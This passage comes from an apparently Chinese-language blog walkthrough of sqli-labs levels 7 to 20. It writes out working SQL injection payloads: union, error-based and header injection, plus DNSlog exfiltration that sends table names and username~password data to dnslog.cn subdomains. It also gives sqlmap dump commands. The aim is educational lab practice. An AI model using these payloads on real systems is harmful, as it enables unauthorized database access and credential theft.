src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937924.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(table_name) from information_schema.tables where table_schema = database()))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937122.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937113.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="hljs-string">&#x27;))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937821.png"><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937089.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(username,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,password) from users ))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937456.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937514.png"></p><p>DNS log注入还有别的应用方法（可以了解一下）：</p><p><a href="https://blog.csdn.net/weixin_47306547/article/details/119833568?spm=1001.2014.3001.5501" title="sqli-labs-master 过关 1-10 （附解题思路及各注入方法解析）_lfi-labs-master闯关-CSDN博客">sqli-labs-master 过关 1-10 （附解题思路及各注入方法解析）_lfi-labs-master闯关-CSDN博客</a></p><h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>直接用sqlmap。</p><p>检测「注入点」</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输入后会问几个问题，根据情况做出选择（影响不大），如果懒得答，加上–batch 参数（–batch：进行默认选择，不需要手动输入YES or NO）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--batch</span><br></code></pre></td></tr></table></figure><p>扫出布尔盲注、时间盲注漏洞</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938851.png"></p><p>查看当前使用的数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938025.png"></p><p>查看「数据表」</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938608.png"></p><p>查看「字段」</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-operator">-</span>T users <span class="hljs-comment">--columns</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938537.png"></p><p>查看「数据」</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-operator">-</span>T users <span class="hljs-comment">--dump</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938687.png"></p><p>用工具虽然方便，但终究体现不出我们的水平，真正的安全工程师可不会是脚本小子（脱离工具就不能干事），但我们先不在这里写脚本，继续往下做题自然就需要我们具备更高的能力了。</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><strong>盲注：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938998.png"></p><p><strong>DNSlog注入：</strong></p><p>同上题</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>盲注：不管怎么输入，总是you are in…… ，用布尔盲注的话判断不了，这种情况只能用时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-9</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>竟然扫出布尔盲注漏洞？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938762.png"></p><p>后续同上，经验证，可以出结果</p><p>DNSlog注入也能用，同上</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>盲注：不管怎么输入，也总是you are in……</p><p>时间盲注，用sqlmap</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-10</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>竟然扫不出来</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938852.png"></p><p>根据这道题的题目，应该是用双引号去闭合，这个可能对sqlmap有难度</p><p>尝试增加测试等级level（1-5，默认是1）和风险等级risk（1-3，默认是1），把这两个都设为3，跑的时间变长不少（跑的东西也更多更细）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-10</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--level 3 --risk 3</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938642.png"></p><p>出来了，剩下的就不赘述了</p><p>也可以用DNSlog注入，同上</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="使用burpsuite"><a href="#使用burpsuite" class="headerlink" title="使用burpsuite"></a>使用burpsuite</h3><p>11到21关的提交方式全是post型的。对于手动注入，也可以在界面注入，但建议配合使用burpsuite、hackbar，注入会更便利；对于自动注入当然还是用sqlmap（不过我们会用burpsuite抓包并存储起来，后续会讲）。</p><p>这里我们优先考虑手动注入（hackbar的使用是最简单的，但在这里为啥不太好使，只好使用bp）</p><p>一开始是一个登录页面</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938940.png"></p><p>简单尝试了一下，Username和Password都输入1，Submit后抓到包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938386.png"></p><p>然后在uname的1后面加一个单引号，点击forward放行</p><p>有sql注入漏洞，应该是联合查询注入与报错注入都有</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938238.png"></p><p><strong>一、联合查询注入</strong></p><p>经尝试，有两个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,2--+ and extractvalue(1,concat(0x7e,select database()))--+&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938342.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938222.png"></p><p>把2所在位置替换成database()，即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>出库</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938574.png"></p><p>后续步骤没啥说的，同上</p><p><strong>二、报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938415.png"></p><p>后续同上</p><h3 id="直接在登录页面注入"><a href="#直接在登录页面注入" class="headerlink" title="直接在登录页面注入"></a>直接在登录页面注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2--+</span><br></code></pre></td></tr></table></figure><p>发现使username后面password有语法错误，注释不好使了？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939743.png"></p><p>Mysql除了–+之外还有种注释方法#</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2#</span><br></code></pre></td></tr></table></figure><p>成功登录，可能这里直接从登录页面注入的话，会把–+处理掉，而#不会受影响，用bp就没有这种影响，这也是我们更推荐用bp原因。有些前端会有过滤，用bp一定程度上可以绕过。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939245.png"></p><p>报错注入显然也是可以的</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>其实最好使用bp去尝试，但这里为了偷懒，直接在登录页面注入。</p><p>怎么输入也没有报错，除了加载的图片LOGIN ATTEMPT FILED之外，什么也没有，然后随便输了几个，竟然报错了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot;&quot;&quot;&quot;&quot;(())))))))) #<br></code></pre></td></tr></table></figure><p>从password猜测username也是用’’)来闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939320.png"></p><p>后来再次尝试才发现，只有输入双引号时才会报错，而且输两个单引号也不可以，发现这俩是不一样的：两个单引号’’双引号”</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>”<br></code></pre></td></tr></table></figure><p>这下不用猜了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939564.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; ) union select 1,2#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939805.png"></p><p>报错注入也行</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’<br></code></pre></td></tr></table></figure><p>可以看出是用’)闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939784.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,2#</span><br></code></pre></td></tr></table></figure><p>Logged in但没显示1，2，没回显位了，联合注入不行了，用报错注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939040.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939258.png"></p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p><code>1’</code>没反应</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>”<br></code></pre></td></tr></table></figure><p>报错，用”闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939835.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; union select 1,2#<br></code></pre></td></tr></table></figure><p>   照样没东西，用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select database())))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939950.png"></p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’#<br></code></pre></td></tr></table></figure><p>只显示登录失败</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2#</span><br></code></pre></td></tr></table></figure><p>   显示登录成功，这样闭合和字段数都出来了</p><p>没有回显也没有报错，只好用DNSlog注入和盲注了，盲注就只用工具，先试试DNSlog注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(SELECT HEX(database())),&#x27;</span><span class="hljs-number">.2</span>icsci.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2 #</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939166.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939894.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939385.png"></p><h3 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h3><p>先用bp抓包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939543.png"></p><p>然后复制抓包的所有内容（uname不要有值），随便放入一个文件里，只要自己能找到，我一般习惯放在sqlmap文件夹里，比如<code>E:\Users\CTFtools\sqlmap\bp抓包\less15.txt</code>，在<code>C:\less15.txt</code>里也行。</p><p>post请求要用-r参数，而且使用-r参数就要像上文一样抓包写包。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939272.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less15.txt<br></code></pre></td></tr></table></figure><p>找到注入点</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940021.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less15.txt <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure><p>成功出库</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939557.png"></p><p>剩下的同上。</p><p>其实也可不用-r参数，不过要加上-data参数（–data命令指定payload进行注入），比如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://localhost/sqli-labs/Less-15/?id=1&quot; <span class="hljs-comment">--batch --data “uname=admin&amp;passwd=admin&amp;submit=Submit” –dbs</span><br></code></pre></td></tr></table></figure><p>还是建议使用-r参数</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>也是盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less16.txt<br></code></pre></td></tr></table></figure><p>扫不出来</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940775.png"></p><p>应该又是双引号闭合，升一下level和risk，用时还挺长</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less16.txt <span class="hljs-comment">--level 3 --risk 3</span><br></code></pre></td></tr></table></figure><p>成功注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940347.png"></p><p>剩下的不必多说</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>怎么输入都没用，没有啥有用的信息，反倒是一直在嘲讽我们</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940200.png"></p><p>换sqlmap扫也扫不出来，把level和risk都升到3也没用。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940503.png"></p><p>查看一下源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940255.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940251.png"></p><p>注意看下面这段代码。</p><p>因为只有代码中$row和$row1存在时，才能进行更新语句、返回报错，所以这里用户名一定要存在，使查询语句返回数据，而且我们不能从查询语句注入，只能从更新语句<code>UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;</code>注入，注入点应该是$passwd。</p><p>这样我们就明白了，<strong>username不是注入点，password才是</strong>，而且我们还要有用户名，这里应该模拟的是我们在某网站登上自己的账号后，利用修改密码来获取数据库里的其他用户数据。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940742.png"></p><p>那这就好说了，我们就用之前爆出来的第一个用户Dumb。</p><p>试了试，联合注入不好使，但是有报错。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940578.png"></p><p>那就报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Dumb<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941087.png"></p><p>出数据库了，哈哈哈，bug off you silly dumb website builder</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><h3 id="手动User-Agent注入"><a href="#手动User-Agent注入" class="headerlink" title="手动User-Agent注入"></a>手动User-Agent注入</h3><p>输入内容，没啥用，从题目来看是Header注入中的User-Agent注入，那就要从User-Agent入手了</p><p>这题也要在登录页面输入Dumb账户</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941748.png"></p><p>抓包（带有Dumb账户），在User-Agent后加单引号，放包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941674.png"></p><p>我们在User-Agent后面加上单引号出现如下报错，可见插入语句是将User-Agent字段内容和ip地址以及账户名作为字符串进行插入且外面有括号。我们要注意U-A字段后面还有两个参数（合三个参数），所以我们在构造时候也需要有三个参数。因为我们用#号把后面（ip和账户名）都注释了。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941004.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941397.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941568.png"></p><p>有报错，用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,2,(extractvalue(1,concat(0x7e,(select database())))))#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941559.png"></p><p>如果我们不写上三个参数，SQL语句不会执行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941495.png"></p><p>我们其实还有种方法，因为U-A后面还有两个参数，我们肯定不能直接用–+或#去注释掉，但是我们可以用别的注释方法，比如下面这条，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>写入这条语句后，实际语句就是……’Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko&#x2F;20100101 Firefox&#x2F;129.0’ and extractvalue(1,concat(0x7e,(select database()))) and ‘1’&#x3D;’1’……，注意前后都加的单引号，这样一看，语句没毛病啊。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941772.png"></p><h3 id="自动U-A注入"><a href="#自动U-A注入" class="headerlink" title="自动U-A注入"></a>自动U-A注入</h3><p>下面到了sqlmap环节</p><p>抓包，在http请求头的user-agent内容后面加上一个*号，写入txt，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941633.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less18.txt<br></code></pre></td></tr></table></figure><p>这个问题答yes（当然也可以在写命令指令的时候加上相应参数）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941211.png"></p><p>其他问题看情况随便答答，稍等一会</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941791.png"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><h3 id="手动Referer注入"><a href="#手动Referer注入" class="headerlink" title="手动Referer注入"></a>手动Referer注入</h3><p>看题目就知道，是Header注入中的referer注入，</p><p>还是像之前一样，输入Dumb，抓包，记得在referer后面加单引号，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941172.png"></p><p>有报错，用报错注入，注意有两个参数</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941449.png"></p><h3 id="自动Referer注入"><a href="#自动Referer注入" class="headerlink" title="自动Referer注入"></a>自动Referer注入</h3><p>抓包，写包，在Referer后面加*</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941830.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less19.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941909.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less19.txt <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941634.png"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><h3 id="手动cookie注入"><a href="#手动cookie注入" class="headerlink" 